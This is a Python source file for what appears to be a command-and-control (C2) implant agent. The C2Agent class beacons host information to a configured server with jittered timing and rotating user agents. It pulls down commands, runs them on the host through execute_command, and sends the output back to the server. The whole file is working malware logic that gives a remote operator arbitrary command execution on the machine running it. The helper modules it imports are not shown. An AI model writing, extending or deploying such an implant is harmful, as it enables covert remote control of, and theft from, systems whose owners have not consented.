from .communication import Communicator
from .system import get_system_info
from .execution import execute_command
from .utils import jitter_sleep, log
from .config import load_config
import platform

class C2Agent:
    def __init__(self, config=None):
        self.config = config or load_config()
        self.comm = Communicator(
            server_url=self.config["server_url"],
            auth_token=self.config["auth_token"],
            encryption_password=self.config["encryption_password"],
            user_agents=self.config["user_agents"]
        )
        self.session_id = None
        self.beacon_interval = self.config.get("beacon_interval", 60)
        self.jitter = self.config.get("jitter", 30)

    def run(self):
        log(f"C2 Agent v1.0.0 starting...")
        log(f"Server: {self.config['server_url']}")
        log(f"Platform: {platform.system()} {platform.release()}")

        failures = 0
        while True:
            try:
                sys_info = get_system_info(self.session_id)
                response = self.comm.beacon(sys_info)

                if response:
                    failures = 0
                    if not self.session_id:
                        self.session_id = response.get('session_id')
                        log(f"Session established: {self.session_id}")

                    tasks = response.get('tasks', [])
                    for task in tasks:
                        task_id = task.get('task_id')
                        cmd = task.get('command')
                        log(f"Executing task {task_id[:8]}...")
                        output = execute_command(cmd)
                        if self.comm.submit_results(task_id, output, self.session_id):
                            log("Results submitted")
                        else:
                            log("Failed to submit results")
                else:
                    failures += 1
                    if failures % 5 == 0:
                        log(f"No response ({failures} failures)")

                jitter_sleep(self.beacon_interval, self.jitter)
            except KeyboardInterrupt:
                log("Agent stopped by user")
                break
            except Exception as e:
                failures += 1
                jitter_sleep(60, 10)